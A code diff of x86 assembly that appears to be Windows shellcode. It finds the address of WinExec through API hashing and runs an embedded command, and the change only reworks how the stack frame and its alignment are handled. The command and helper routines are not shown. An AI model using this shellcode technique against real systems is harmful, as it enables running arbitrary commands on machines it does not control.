@@ -4,26 +4,21 @@
 entry:
   ; store context
   push ebx                              ; store ebx
+  push ebp                              ; store ebp
+  mov ebp, esp                          ; create new stack frame
+  and esp, 0xFFFFFFF0                   ; ensure stack is 16 bytes aligned
 
   ; calculate entry address
   call calc_entry_addr                  ; calculate the entry address
   flag_CEA:                             ; flag for calculate entry address
 
-  ; clear the direction flag
-  cld
-
   ; find "kernel32.dll, WinExec"
+  cld                                   ; clear the direction flag
   push 0x61DA2999                       ; set hash key
   push 0x0AE20914                       ; set function hash
   call find_api                         ; try to find api address
   cmp eax, 0                            ; check target function is found
   jz not_found                          ;
-
-  ; ensure stack is 16 bytes aligned
-  push edi                              ; store edi
-  mov edi, esp                          ; store current stack to edi
-  and edi, 0xF                          ; calculate the offset
-  sub esp, edi                          ; adjust current stack
 
   ; call "kernel32.dll, WinExec"
   lea edx, [ebx+command]                ; lpCmdLine
@@ -33,12 +28,10 @@ entry:
   push edx                              ; push lpCmdLine
   call eax                              ; call api function
 
-  ; restore aligned stack
-  add esp, edi                          ; restore stack from edi
-  pop edi                               ; restore edi
-
   not_found:                            ;
   ; restore context
+  mov esp, ebp                          ; restore stack
+  pop ebp                               ; restore ebp
   pop ebx                               ; restore ebx
   ret                                   ; return to the caller
 
